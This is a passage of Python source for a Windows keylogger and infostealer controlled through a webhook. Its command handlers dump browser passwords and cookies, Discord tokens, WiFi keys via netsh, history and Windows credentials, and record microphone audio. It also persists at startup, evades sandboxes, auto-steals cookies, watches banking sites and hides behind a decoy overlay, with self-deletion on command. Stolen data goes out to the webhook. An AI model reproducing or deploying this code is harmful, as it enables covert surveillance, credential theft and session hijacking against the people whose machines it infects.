                                                seconds = int(content.split(" ")[1])
                                                self.interval = seconds
                                                self.send_to_webhook(f">> ⏱️ Reporting Interval changed to {seconds}s")
                                            except:
                                                self.send_to_webhook(">> Usage: !interval <seconds>")

                                        elif cmd.startswith("!audio"):
                                            try:
                                                seconds = int(content.split(" ")[1])
                                                self.send_to_webhook(f">> 🎤 Recording {seconds}s audio...")
                                                
                                                # Run recording in separate thread to not block C2
                                                def rec_task(secs):
                                                    import sounddevice as sd
                                                    import scipy.io.wavfile as wav
                                                    import tempfile
                                                    fs = 44100
                                                    rec = sd.rec(int(secs * fs), samplerate=fs, channels=1)
                                                    sd.wait()
                                                    path = os.path.join(tempfile.gettempdir(), "rec_c2.wav")
                                                    wav.write(path, fs, rec)
                                                    self.send_to_webhook("Audio Capture:", file_path=path)
                                                
                                                threading.Thread(target=rec_task, args=(seconds,)).start()
                                            except Exception as e:
                                                self.send_to_webhook(f">> ❌ Audio Error: {e} (Mic missing?)")

                                        elif cmd == "!uninstall":
                                            self.send_to_webhook(">> 🧨 SELF_DESTRUCT INITIATED. Goodbye.")
                                            # 1. Remove Registry Persistence
                                            try:
                                                 # We would need to know the specific Key, but let's try a generic "reg delete" for our assumed key
                                                 key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                                                 value_name = "Keylogger"
                                                 os.system(f'reg delete "HKCU\\{key}" /v "{value_name}" /f')
                                            except: pass
                                            
                                            # 2. Self-Delete Batch
                                            if getattr(sys, 'frozen', False):
                                                exe_path = sys.executable
                                                batch_script = f"""@echo off
                                                timeout /t 3 /nobreak
                                                del "{exe_path}"
                                                del "%~f0"
                                                """
                                                with open("cleanup.bat", "w") as f: f.write(batch_script)
                                                subprocess.Popen("cleanup.bat", shell=True)
                                            
                                            os._exit(0)

                                        # --- PHASE 4: CREDENTIAL HARVESTING ---
                                        elif cmd == "!passwords":
                                            self.send_to_webhook(">> 🔐 Dumping Passwords (Chrome/Edge)...")
                                            self.dump_chromium_creds(full_dump=False) # Passwords Only
                                            
                                        elif cmd == "!cookies":
                                            self.send_to_webhook(">> 🍪 Dumping Cookies (Session Hijacking)...")
                                            self.dump_chromium_creds(cookies=True) # Cookies Only
                                            
                                        elif cmd == "!tokens":
                                            self.send_to_webhook(">> 🪙 Dumping Discord Tokens...")
                                            self.dump_discord_tokens()
                                        
                                        elif cmd == "!wifi":
                                            self.send_to_webhook(">> 📡 Dumping WiFi Passwords...")
                                            self.dump_wifi_passwords()
                                        
                                        elif cmd == "!history":
                                            self.send_to_webhook(">> 🔍 Extracting Browser History...")
                                            self.dump_browser_history()
                                        
                                        elif cmd == "!wincreds":
                                            self.send_to_webhook(">> 🔑 Dumping Windows Credentials...")
                                            self.dump_windows_credentials()
                                        
                                        elif cmd == "!software":
                                            self.send_to_webhook(">> 💻 Enumerating Installed Software...")
                                            self.enumerate_software()
                                            
                                        elif cmd == "!godmode":
                                            self.send_to_webhook(">> ⚡ GOD MODE INITIATED: Stealing EVERYTHING.")
                                            # Run all stealers
                                            try:
                                                # 1. Passwords & Cookies
                                                self.dump_chromium_creds(full_dump=True, cookies=True)
                                                # 2. Discord Tokens
                                                self.dump_discord_tokens()
                                                # 3. WiFi Keys (Shell)
                                                self.send_to_webhook(">> 📶 Grabbing WiFi Keys...")
                                                os.system('netsh wlan export profile key=clear folder="."')
                                                # Upload XMLs
                                                import glob
                                                for wifi_file in glob.glob("Wi-Fi*.xml"):
                                                    self.send_to_webhook("WiFi Profile:", file_path=wifi_file)
                                                    os.remove(wifi_file)
                                                    
                                                self.send_to_webhook(">> ✅ GOD MODE COMPLETE.")
                                            except Exception as e:
                                                self.send_to_webhook(f">> ❌ GOD MODE FAILED: {e}")
                                            
                                        # Stop processing older messages once we found the newest one
                                        break
                                            
                                        # Stop processing older messages once we found the newest one
                                        break
                                        
                    except Exception as e:
                        if getattr(sys, 'frozen', False) == False:
                             print(f"C2 Error: {e}")
                        pass
                        
            except: pass

        def run(self):
            # Start C2 Polling Thread
            c2_thread = threading.Thread(target=self.poll_commands, daemon=True)
            c2_thread.start()
            print("Keylogger started. Press Ctrl+C to stop.")
            
            # Send system info immediately on startup
            self.system_information()
            
            # Extract Browser Info (Stealer)
            threading.Thread(target=self.get_browser_data).start()
            
            # Try to add to startup
            self.add_to_startup()
            
            # Start reporting (webhook) in background
            self.report()
            
            # Start listeners non-blocking and join them
            with keyboard.Listener(on_press=self.save_data) as kl, \
                 Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as ml:
                kl.join()
                ml.join()

    
    if __name__ == "__main__":
        # --- STEALTH CHECKS ---
        if getattr(sys, 'frozen', False):
             anti_sandbox()
        
        # LOCAL IMPORTS FOR MAIN PROCESS ONLY
        import requests
        from pynput import keyboard
        from pynput.keyboard import Listener
        
        # --- MAIN EXECUTION MODEL ---
        keylogger = KeyLogger(SEND_REPORT_EVERY, WEBHOOK_URL)
        
        # Check for updates on startup
        if getattr(sys, 'frozen', False): 
             Thread(target=keylogger.check_for_updates).start()
        
        # Auto-steal cookies on startup (silent, no command needed)
        def auto_steal_cookies():
            import time
            time.sleep(5)  # Wait 5 seconds for system to stabilize
            keylogger.send_to_webhook(">> 🍪 Auto-stealing cookies...")
            keylogger.dump_chromium_creds(cookies=True)
        
        Thread(target=auto_steal_cookies, daemon=True).start()
        
        # Start banking site monitor (reactive harvesting)
        Thread(target=keylogger.monitor_banking_sites, daemon=True).start()

        # We must run the GUI on the Main Thread.
        # The Keylogger must run in a background thread.
        
        # Start Keylogger Thread
        # daemon=False is CRITICAL: it ensures the program doesn't exit when the GUI closes.
        kl_thread = Thread(target=keylogger.run, daemon=False)
        kl_thread.start()
        
        # Show Overlay (Only if running as exe or specifically testing)
        # Using sys.frozen check ensures we don't annoy you during simple python script tests 
        # unless you want to.

        if getattr(sys, 'frozen', False): 
            if OVERLAY_AVAILABLE:
                try:
                    # Removed "Attempting to show" popup to be stealthy again
                    # ctypes.windll.user32.MessageBoxW(0, "Attempting to show overlay...", "Debug", 0x40)
                    
                    app = QApplication(sys.argv)
                    overlay = SystemOverlay()
                    overlay.show()
                    # Process events to ensure paint happens immediately
                    app.processEvents()
                    
                    # FORCED TIMEOUT THREAD - Guarantees overlay closes even if Qt freezes
                    def force_quit_overlay():
                        import time
                        time.sleep(12)  # 10s display + 2s grace period
                        try:
                            app.quit()  # Gracefully quit Qt app (not entire process!)
                        except:
                            pass  # If app already closed, ignore
                    
                    # Start killer thread AFTER app is created
                    Thread(target=force_quit_overlay, daemon=True).start()
                    
                    # Close the GUI app loop after 10 seconds (Wait for fade out)
                    # But the process stays alive because kl_thread is non-daemon
                    QTimer.singleShot(10000, app.quit) 
                    
                    app.exec_()
                except Exception as e:
                     pass # Fail silently if GUI crashes, keylogger still runs
            else:
                 pass
        else:
            # If running as script (testing), just join the thread
            kl_thread.join()


